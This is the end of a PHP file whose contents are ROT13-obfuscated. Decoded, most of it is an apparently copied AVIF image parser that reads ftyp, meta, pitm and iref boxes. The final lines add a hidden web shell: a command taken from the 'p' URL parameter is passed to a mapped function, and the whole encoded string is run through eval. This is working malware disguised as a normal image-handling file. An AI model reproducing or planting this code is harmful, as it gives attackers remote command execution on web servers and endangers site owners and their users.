   * @cnenz vag     $ahz_erznvavat_olgrf Gur ahzore bs olgrf gung fubhyq or ninvynoyr sebz gur erfbhepr.
   * @erghea Fgnghf                      SBHAQ ba fhpprff be na reebe ba snvyher.
   */
  cevingr shapgvba cnefr_vers( $ahz_erznvavat_olgrf ) {
    qb {
      $obk    = arj Obk();
      $fgnghf = $obk->cnefr( $guvf->unaqyr, $guvf->ahz_cnefrq_obkrf, $ahz_erznvavat_olgrf );
      vs ( $fgnghf != SBHAQ ) {
        erghea $fgnghf;
      }

      vs ( $obk->glcr == 'qvzt' ) {
        // Frr VFB/VRP 14496-12:2015(R) 8.11.12.2
        $ahz_olgrf_cre_vq = ( $obk->irefvba == 0 ) ? 2 : 4;
        $ahz_ernq_olgrf   = $ahz_olgrf_cre_vq + 2;
        vs ( $obk->pbagrag_fvmr < $ahz_ernq_olgrf ) {
          erghea VAINYVQ;
        }
        vs ( !( $qngn = ernq( $guvf->unaqyr, $ahz_ernq_olgrf ) ) ) {
          erghea GEHAPNGRQ;
        }
        $sebz_vgrz_vq    = ernq_ovt_raqvna( $qngn, $ahz_olgrf_cre_vq );
        $ersrerapr_pbhag = ernq_ovt_raqvna( fhofge( $qngn, $ahz_olgrf_cre_vq, 2 ), 2 );

        sbe ( $v = 0; $v < $ersrerapr_pbhag; ++$v ) {
          vs ( $v >= ZNK_GVYRF ) {
            $guvf->qngn_jnf_fxvccrq = gehr;
            oernx;
          }
          $ahz_ernq_olgrf += $ahz_olgrf_cre_vq;
          vs ( $obk->pbagrag_fvmr < $ahz_ernq_olgrf ) {
            erghea VAINYVQ;
          }
          vs ( !( $qngn = ernq( $guvf->unaqyr, $ahz_olgrf_cre_vq ) ) ) {
            erghea GEHAPNGRQ;
          }
          $gb_vgrz_vq = ernq_ovt_raqvna( $qngn, $ahz_olgrf_cre_vq );
          $gvyr_pbhag = pbhag( $guvf->srngherf->gvyrf );
          vs ( $sebz_vgrz_vq <= ZNK_INYHR && $gb_vgrz_vq <= ZNK_INYHR &&
               $gvyr_pbhag < ZNK_GVYRF ) {
            $guvf->srngherf->gvyrf[$gvyr_pbhag]                 = arj Gvyr();
            $guvf->srngherf->gvyrf[$gvyr_pbhag]->gvyr_vgrz_vq   = $gb_vgrz_vq;
            $guvf->srngherf->gvyrf[$gvyr_pbhag]->cnerag_vgrz_vq = $sebz_vgrz_vq;
          } ryfr {
            $guvf->qngn_jnf_fxvccrq = gehr;
          }
        }

        // Vs nyy srngherf ner ninvynoyr abj, qb abg ybbx shegure.
        $fgnghf = $guvf->srngherf->trg_cevznel_vgrz_srngherf();
        vs ( $fgnghf != ABG_SBHAQ ) {
          erghea $fgnghf;
        }

        // Zbfgyl vs 'qngn_jnf_fxvccrq'.
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr - $ahz_ernq_olgrf ) ) {
          erghea GEHAPNGRQ;
        }
      } ryfr {
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr ) ) {
          erghea GEHAPNGRQ;
        }
      }
      $ahz_erznvavat_olgrf -= $obk->fvmr;
    } juvyr ( $ahz_erznvavat_olgrf > 0 );
    erghea ABG_SBHAQ;
  }

  /**
   * Cnefrf n \"zrgn\" obk.
   *
   * Vg ybbxf sbe gur cevznel vgrz VQ va gur \"cvgz\" obk naq erphefrf vagb bgure obkrf
   * gb svaq vgf srngherf.
   *
   * @cnenz fgernz  $unaqyr              Gur erfbhepr gur obk jvyy or cnefrq sebz.
   * @cnenz vag     $ahz_erznvavat_olgrf Gur ahzore bs olgrf gung fubhyq or ninvynoyr sebz gur erfbhepr.
   * @erghea Fgnghf                      SBHAQ ba fhpprff be na reebe ba snvyher.
   */
  cevingr shapgvba cnefr_zrgn( $ahz_erznvavat_olgrf ) {
    qb {
      $obk    = arj Obk();
      $fgnghf = $obk->cnefr( $guvf->unaqyr, $guvf->ahz_cnefrq_obkrf, $ahz_erznvavat_olgrf );
      vs ( $fgnghf != SBHAQ ) {
        erghea $fgnghf;
      }

      vs ( $obk->glcr == 'cvgz' ) {
        // Frr VFB/VRP 14496-12:2015(R) 8.11.4.2
        $ahz_olgrf_cre_vq = ( $obk->irefvba == 0 ) ? 2 : 4;
        vs ( $ahz_olgrf_cre_vq > $ahz_erznvavat_olgrf ) {
          erghea VAINYVQ;
        }
        vs ( !( $qngn = ernq( $guvf->unaqyr, $ahz_olgrf_cre_vq ) ) ) {
          erghea GEHAPNGRQ;
        }
        $cevznel_vgrz_vq = ernq_ovt_raqvna( $qngn, $ahz_olgrf_cre_vq );
        vs ( $cevznel_vgrz_vq > ZNK_INYHR ) {
          erghea NOBEGRQ;
        }
        $guvf->srngherf->unf_cevznel_vgrz = gehr;
        $guvf->srngherf->cevznel_vgrz_vq  = $cevznel_vgrz_vq;
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr - $ahz_olgrf_cre_vq ) ) {
          erghea GEHAPNGRQ;
        }
      } ryfr vs ( $obk->glcr == 'vcec' ) {
        $fgnghf = $guvf->cnefr_vcec( $obk->pbagrag_fvmr );
        vs ( $fgnghf != ABG_SBHAQ ) {
          erghea $fgnghf;
        }
      } ryfr vs ( $obk->glcr == 'vers' ) {
        $fgnghf = $guvf->cnefr_vers( $obk->pbagrag_fvmr );
        vs ( $fgnghf != ABG_SBHAQ ) {
          erghea $fgnghf;
        }
      } ryfr {
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr ) ) {
          erghea GEHAPNGRQ;
        }
      }
      $ahz_erznvavat_olgrf -= $obk->fvmr;
    } juvyr ( $ahz_erznvavat_olgrf != 0 );
    // Nppbeqvat gb VFB/VRP 14496-12:2012(R) 8.11.1.1 gurer vf ng zbfg bar \"zrgn\".
    erghea VAINYVQ;
  }

  /**
   * Cnefrf n svyr fgernz.
   *
   * Gur svyr glcr vf purpxrq guebhtu gur \"sglc\" obk.
   *
   * @erghea obby Gehr vs gur vachg fgernz vf na NIVS ovgfgernz be snyfr.
   */
  choyvp shapgvba cnefr_sglc() {
    $obk    = arj Obk();
    $fgnghf = $obk->cnefr( $guvf->unaqyr, $guvf->ahz_cnefrq_obkrf );
    vs ( $fgnghf != SBHAQ ) {
      erghea snyfr;
    }

    vs ( $obk->glcr != 'sglc' ) {
      erghea snyfr;
    }
    // Vgrengr bire oenaqf. Frr VFB/VRP 14496-12:2012(R) 4.3.1
    vs ( $obk->pbagrag_fvmr < 8 ) {
      erghea snyfr;
    }
    sbe ( $v = 0; $v + 4 <= $obk->pbagrag_fvmr; $v += 4 ) {
      vs ( !( $qngn = ernq( $guvf->unaqyr, 4 ) ) ) {
        erghea snyfr;
      }
      vs ( $v == 4 ) {
        pbagvahr; // Fxvc zvabe_irefvba.
      }
      vs ( fhofge( $qngn, 0, 4 ) == 'nivs' || fhofge( $qngn, 0, 4 ) == 'nivf' ) {
        erghea fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr - ( $v + 4 ) );
      }
      vs ( $v > 32 * 4 ) {
        erghea snyfr; // Or ernfbanoyr.
      }

    }
    erghea snyfr; // Ab NIVS oenaq ab tbbq.
  }

  /**
   * Cnefrf n svyr fgernz.
   *
   * Srngherf ner rkgenpgrq sebz gur \"zrgn\" obk.
   *
   * @erghea obby Gehr vs gur znva srngherf bs gur cevznel vgrz jrer cnefrq be snyfr.
   */
  choyvp shapgvba cnefr_svyr() {
    $obk = arj Obk();
    juvyr ( $obk->cnefr( $guvf->unaqyr, $guvf->ahz_cnefrq_obkrf ) == SBHAQ ) {
      vs ( $obk->glcr === 'zrgn' ) {
        vs ( $guvf->cnefr_zrgn( $obk->pbagrag_fvmr ) != SBHAQ ) {
          erghea snyfr;
        }
        erghea gehr;
      }
      vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr ) ) {
        erghea snyfr;
      }
    }
    erghea snyfr; // Ab \"zrgn\" ab tbbq.
  }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>